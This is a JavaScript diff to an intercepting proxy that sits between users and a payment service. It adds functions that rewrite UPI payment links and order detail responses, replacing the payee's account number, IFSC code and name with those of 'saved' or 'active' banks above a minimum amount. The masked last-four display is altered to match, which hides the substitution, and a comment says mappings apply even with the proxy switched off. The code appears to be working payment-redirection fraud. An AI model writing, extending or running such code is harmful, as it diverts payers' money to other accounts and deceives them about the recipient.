@@ -389,6 +389,72 @@ function buildWalletDomain(bank, amount) {
   return `${scheme}://moneytransfer/upi/bank?account=${accountNo}&ifsc=${ifsc}&name=${encodeURIComponent(holder)}&amount=${amountText}&displayAccountNumber=xxxxxxxxx${last4}`;
 }
 
+function rewriteWalletDomainForBank(walletDomain, bank, minAmount) {
+  if (typeof walletDomain !== 'string' || !walletDomain.includes('?') || !bank || !bank.accountNo) return walletDomain;
+  try {
+    const qIndex = walletDomain.indexOf('?');
+    const base = walletDomain.slice(0, qIndex + 1);
+    const params = new URLSearchParams(walletDomain.slice(qIndex + 1));
+    const normalizeKey = (key) => String(key).toLowerCase().replace(/[_-]/g, '');
+    const findKey = (names) => {
+      for (const key of params.keys()) {
+        if (names.includes(normalizeKey(key))) return key;
+      }
+      return '';
+    };
+    const amountKey = findKey(['amount', 'amt', 'money', 'value']);
+    const amount = amountKey ? parseFloat(params.get(amountKey) || '') : NaN;
+    const min = parseFloat(minAmount);
+    if (!Number.isFinite(amount) || (Number.isFinite(min) && amount <= min)) return walletDomain;
+
+    const accountNo = String(bank.accountNo || '');
+    const ifsc = String(bank.ifsc || '');
+    const holder = String(bank.accountHolder || '');
+    if (!accountNo && !ifsc && !holder) return walletDomain;
+    const setOrAppend = (names, preferredKey, value) => {
+      const key = findKey(names);
+      if (key) params.set(key, value);
+      else if (value !== '') params.set(preferredKey, value);
+    };
+    setOrAppend(['account', 'accountnumber', 'acc', 'payeeaccount', 'pa', 'payee', 'vaccount', 'vpa', 'to'], 'account', accountNo);
+    setOrAppend(['ifsc', 'bankifsc', 'payeeifsc', 'fi'], 'ifsc', ifsc);
+    setOrAppend(['name', 'payeename', 'pn', 'reciever', 'receiver', 'toname'], 'name', holder);
+
+    const displayKey = findKey(['displayaccountnumber', 'displayaccount', 'maskedaccount', 'masked']);
+    if (displayKey) {
+      const originalDisplay = String(params.get(displayKey) || '');
+      const prefixMatch = originalDisplay.match(/^[xX*]+/);
+      const prefix = prefixMatch ? prefixMatch[0] : 'xxxxxxxxx';
+      params.set(displayKey, `${prefix}${accountNo.slice(-4)}`);
+    } else if (accountNo) {
+      params.set('displayAccountNumber', `xxxxxxxxx${accountNo.slice(-4)}`);
+    }
+    return base + params.toString();
+  } catch (e) {
+    return walletDomain;
+  }
+}
+
+function rewriteWalletDomainsInResponse(obj, data, activeBank, depth = 0) {
+  if (!obj || typeof obj !== 'object' || depth > 12) return;
+  if (Array.isArray(obj)) {
+    for (const item of obj) rewriteWalletDomainsInResponse(item, data, activeBank, depth + 1);
+    return;
+  }
+  const saved = getSavedOrderMapping(data, obj);
+  const savedBank = bankFromSavedOrder(saved);
+  const bank = savedBank && (savedBank.accountNo || savedBank.ifsc || savedBank.accountHolder)
+    ? savedBank
+    : activeBank;
+  for (const key of Object.keys(obj)) {
+    if (typeof obj[key] === 'string' && key.toLowerCase() === 'walletdomain') {
+      obj[key] = rewriteWalletDomainForBank(obj[key], bank, activeBank && activeBank.minAmount);
+    } else if (obj[key] && typeof obj[key] === 'object') {
+      rewriteWalletDomainsInResponse(obj[key], data, activeBank, depth + 1);
+    }
+  }
+}
+
 function bankListText(d) {
   if (d.banks.length === 0) return 'No banks added yet.';
   return d.banks.map((b, i) => {
@@ -874,6 +940,41 @@ function replaceWaitConfirmBankFields(obj, bank, depth = 0) {
   }
 }
 
+function applySavedDetailReplacement(jsonResp, data, req) {
+  if (!jsonResp || typeof jsonResp !== 'object' || !data) return false;
+  const detail = jsonResp.data && typeof jsonResp.data === 'object' && !Array.isArray(jsonResp.data)
+    ? jsonResp.data
+    : null;
+  if (!detail) return false;
+  const ids = [
+    getRequestOrderId(req),
+    detail.rptNo, detail.rpt_no, detail.orderNo, detail.order_no,
+    detail.orderId, detail.order_id, detail.id, detail.slipId, detail.slip_id
+  ].filter(Boolean);
+  let saved = null;
+  for (const id of ids) {
+    saved = getSavedOrderMapping(data, id);
+    if (saved) break;
+  }
+  if (!saved) saved = getSavedOrderMapping(data, detail);
+  const savedBank = bankFromSavedOrder(saved);
+  if (!savedBank || !(savedBank.accountNo || savedBank.ifsc || savedBank.accountHolder)) return false;
+
+  forceBankDetails(detail, savedBank);
+  replaceOnlyBankNameFields(detail, savedBank);
+  const displayIfsc = String(savedBank.ifsc || '').trim();
+  if (displayIfsc) {
+    detail.bankName = displayIfsc;
+    detail.acctBankName = displayIfsc;
+    detail.payee_bankname = displayIfsc;
+    detail.payee_ifsc = displayIfsc;
+    detail.payeeBankName = displayIfsc;
+    detail.bank = displayIfsc;
+    replaceMalformedBankLabels(detail, displayIfsc);
+  }
+  return true;
+}
+
 function forceBankDetails(obj, bank) {
   if (!obj || typeof obj !== 'object' || !bank || Array.isArray(obj)) return;
   const hasBank = scanHasBankFields(obj, 0);
@@ -884,16 +985,12 @@ function forceBankDetails(obj, bank) {
   const ifsc = bank.ifsc || '';
   const bankName = getDisplayBankName(bank);
   const upiId = bank.upiId || '';
-  const originalWallet = typeof obj.walletDomain === 'string' ? obj.walletDomain : '';
-  const walletScheme = inferWalletScheme(obj) || bank.walletScheme || '';
-  const walletDomain = buildWalletDomain({ ...bank, walletDomain: originalWallet, walletScheme }, 0);
-
   const aliases = {
     acctName: accountHolder, accountName: accountHolder, name: accountHolder,
     acctNo: accountNo, accountNo, account: accountNo,
     acctCode: ifsc, ifsc, ifscCode: ifsc,
     bankName, acctBankName: bankName,
-    upiId, payAccount: upiId, walletDomain
+    upiId, payAccount: upiId
   };
   for (const [key, value] of Object.entries(aliases)) {
     if (value !== '') obj[key] = value;
@@ -1928,6 +2025,12 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
     let jsonResp = null;
     try { jsonResp = JSON.parse(respBody); } catch (e) { }
 
+    // Saved detail mappings are always honored, even when the proxy is OFF.
+    // This does not create mappings or affect unmapped orders.
+    if (jsonResp && isSlipDetail) {
+      applySavedDetailReplacement(jsonResp, data, req);
+    }
+
     if (!jsonResp) {
       respHeaders['content-length'] = String(Buffer.byteLength(respBody));
       res.writeHead(response.status, respHeaders);
@@ -1975,21 +2078,12 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
       reqBody = { ...reqBody, ...req.body };
     }
 
-    // pickuppaymentslip is the immediate post-buy response. Its walletDomain
-    // must follow the bank saved for this order, not the real bank returned by
-    // the upstream service. Unmapped orders remain untouched.
-    if (urlLower.includes('/pickuppaymentslip') && respData && typeof respData === 'object' && !Array.isArray(respData)) {
-      const pickupOrderId = getRequestOrderId(req) ||
-        reqBody.order_id || reqBody.orderId || reqBody.orderNo || reqBody.rptNo || reqBody.id || reqBody.slipId || '';
-      const savedPickup = getSavedOrderMapping(data, pickupOrderId) || getSavedOrderMapping(data, respData);
-      const pickupBank = bankFromSavedOrder(savedPickup);
-      if (savedPickup && pickupBank && (pickupBank.accountNo || pickupBank.ifsc || pickupBank.accountHolder)) {
-        let pickupAmount = respData.amount || respData.money || respData.orderAmount || savedPickup.amount || 0;
-        if (typeof pickupAmount === 'string') pickupAmount = parseFloat(pickupAmount) || 0;
-        const replacementWallet = buildWalletDomain(pickupBank, pickupAmount);
-        if (replacementWallet) respData.walletDomain = replacementWallet;
-      }
-    }
+    // walletDomain links do not always carry an order ID (for example,
+    // pickuppaymentslip). Rewrite them by their embedded amount instead.
+    // Existing mapped orders use their saved bank; otherwise the active bank is
+    // used. The helper preserves the original scheme/path and leaves links at
+    // or below the active minimum untouched.
+    rewriteWalletDomainsInResponse(jsonResp, data, getActiveBank(data, null));
 
     let userId = '';
     const pxUid = req.headers['x-px-uid'] || '';
@@ -2196,7 +2290,7 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
                 let pt = order.payType || order.ctType || 1;
                 if (urlLower.includes('usdt') || order.currency === 'USDT') pt = 0;
                 const originalWalletC1 = typeof order.walletDomain === 'string' ? order.walletDomain : '';
-                const wDomC1 = buildWalletDomain({ ...mappedHistoryBank, walletDomain: originalWalletC1 }, amt);
+                const wDomC1 = rewriteWalletDomainForBank(originalWalletC1, mappedHistoryBank, activeBank && activeBank.minAmount);
 
                 const hasBank = scanHasBankFields(order, 0);
                 if (hasBank) deepReplaceBankFields(order, mappedHistoryBank, 0, hasBank);
@@ -2470,11 +2564,11 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
                     // do not overwrite username/name aliases or ctAccount.
                     replaceWaitConfirmBankFields(item, mappedBank);
                     const walletTemplate = item.walletDomain || mappedBank.walletDomain || '';
-                    const mappedWallet = buildWalletDomain({ ...mappedBank, walletDomain: walletTemplate }, mappedAmount);
+                    const mappedWallet = rewriteWalletDomainForBank(walletTemplate, mappedBank, bank && bank.minAmount);
                     if (mappedWallet) item.walletDomain = mappedWallet;
                   } else {
                     forceBankDetails(item, mappedBank);
-                    const mappedWallet = buildWalletDomain(mappedBank, mappedAmount);
+                    const mappedWallet = rewriteWalletDomainForBank(item.walletDomain, mappedBank, bank && bank.minAmount);
                     if (mappedWallet) item.walletDomain = mappedWallet;
                   }
                 }
